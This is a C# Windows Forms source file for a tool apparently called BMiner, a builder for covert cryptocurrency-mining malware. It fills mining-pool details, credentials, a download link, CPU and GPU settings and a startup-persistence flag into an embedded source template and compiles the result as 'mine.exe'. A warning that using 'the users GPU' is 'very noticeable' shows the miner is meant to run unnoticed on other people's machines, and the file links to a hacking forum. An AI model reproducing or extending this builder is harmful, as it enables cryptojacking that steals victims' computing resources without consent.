using System;
using System.Windows.Forms;
using Miner_Downloader.Properties;

namespace Miner_Downloader
{
    public partial class BMiner : Form
    {
        public BMiner()
        {
            InitializeComponent();
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            label2.Text = String.Format("{0} %", tbCpu.Value);
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            MessageBox.Show(
                "Using the users GPU to mine is very noticeable, this is not recommended. Are you sure you want to enable it?",
                "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (tbPool.Text != "" && tbUserName.Text != "" && tbPassword.Text != "" && tbLink.Text != "")
            {
                using (var save = new SaveFileDialog())
                {
                    save.Filter = ".exe|*.exe";
                    save.FileName = "mine.exe";

                    if (save.ShowDialog() == DialogResult.OK)
                    {
                        string source = Resources.moneys;
                      
                        source =
                            source.Replace("[pool:port]", tbPool.Text)
                                .Replace("[username]", tbUserName.Text)
                                .Replace("[password]", tbPassword.Text)
                                .Replace("[GPU]", cbGpu.Checked.ToString())
                                .Replace("[link]", tbLink.Text)
                                .Replace("[cpu]", tbCpu.Value.ToString())
                                .Replace("[gpu]", cbGpu.Checked.ToString())
                                .Replace("[startup]", chStartUp.Checked.ToString());

                        Compil.CompileParams(source, save.FileName, cbFrame.Text);
                    }
                }
            }
            else
            {
                MessageBox.Show("Not all fields are filled", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://xakfor.net/forum/");
        }
    }
}
